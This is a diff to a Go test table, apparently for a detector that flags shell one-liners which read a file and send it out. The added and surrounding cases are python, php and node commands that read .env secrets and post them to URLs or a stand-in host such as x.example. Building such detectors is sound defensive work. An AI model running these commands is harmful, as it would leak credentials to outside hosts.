@@ -510,6 +510,14 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`python3 -c "requests.post(url, headers={'X-D': open('.env').read()})"`, []string{"sent:.env"}},
 		{`php -r 'curl_setopt($ch, CURLOPT_URL, "https://x.example/?d=" . file_get_contents(".env"));'`, []string{"sent:.env"}},
 		{`python3 -c "requests.post(url, json={'token': open('.env').read()})"`, []string{"sent:.env"}},
+		// What a call that authenticates with a credential returns is its response, not the
+		// credential: forwarding it sends no file.
+		{`python3 -c "k = open('.env').read().strip(); r = requests.get('https://api.example', headers={'Authorization': k}); requests.post(hook, json=r.json())"`, []string{".env"}},
+		{`node -e 'const k = fs.readFileSync(".env", "utf8"); fetch(url, {headers: {Authorization: k}}).then(res => fetch(hook, {method: "POST", body: res.body}))'`, []string{".env"}},
+		// A GET sends its URL parameters and other headers.
+		{`python3 -c "requests.get(url, params={'d': open('.env').read()})"`, []string{"sent:.env"}},
+		{`python3 -c "k = open('.env').read(); r = requests.get(url, headers={'A': k})"`, []string{"sent:.env"}},
+		{`python3 -c "c = json.load(open('.env')); print(c.get('k'))"`, []string{".env"}},
 	})
 }
 
